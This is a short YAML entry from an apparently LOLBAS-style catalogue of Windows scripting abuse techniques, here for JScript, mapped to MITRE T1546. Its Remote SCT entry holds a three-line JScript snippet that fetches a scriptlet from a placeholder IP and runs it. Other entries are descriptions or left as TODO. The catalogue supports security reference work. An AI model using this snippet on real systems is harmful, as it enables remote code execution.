---
Name: JScript
Description: JScript is a common scripting language on Windows environements. It is Windows implementation of Javascript.
Author: 'Hegusung'
Created: 2024-10-23
Categories:
  - Category: COM Objects
    Description: JScript - COM
    Usecase: JScript can access and execute COM objects
    MitreID: T1546
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: LOLBas
      - Origin: Clickable
  - Category: Remote SCT
    Description: JScript - SCT
    Usecase: JScript can execute a SCT file using the GetObject function. Remote files can be accessed
    Code: |
      var SCTObj;
      SCTObj = GetObject("script: http://1.2.3.4/script.sct");
      SCTObj.Exec();
    MitreID: T1546
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: LOLBas
      - Origin: Clickable
  - Category: WMI
    Description: JScript - WMI
    Usecase: JScript can execute a WMI Queries by leveraging com objects
    Code: |
      TODO: Exemple code
    MitreID: T1546
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: LOLBas
      - Origin: Clickable
Detection:
Resources:
  - Link: https://hegusung.github.io/LOLBAS-Project-hegusung.github.io/#/jscript
Acknowledgement:
---
